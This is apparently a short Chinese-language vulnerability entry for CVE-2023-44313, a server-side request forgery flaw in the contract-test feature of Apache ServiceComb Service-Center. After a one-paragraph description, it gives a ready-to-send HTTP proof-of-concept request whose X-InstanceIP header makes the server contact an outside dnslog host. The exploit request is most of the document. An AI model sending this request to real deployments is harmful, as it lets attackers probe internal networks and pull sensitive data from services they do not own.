## Apache-ServiceComb存在SSRF漏洞(CVE-2023-44313)

Apache ServiceComb Service-Center是Apache基金会的一个基于Restful的服务注册中心,提供微服务发现和微服务管理,在ServiceComb Service-Center 中的 frontend 组件的契约测试功能存在SSRF漏洞,由于未验证请求的instanceIP参数,攻击者可以向/testSchema/下的路由发送恶意请求获取内部敏感信息。

## poc

```
GET /testSchema/sc HTTP/1.1
Host: 127.0.0.1:30103
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
X-InstanceIP:6e65vf.dnslog.cnn
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
If-Modified-Since: Mon, 14 Mar 2022 14:09:37 GMT
Connection: close
```

![image-20240626215735184](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406262157297.png)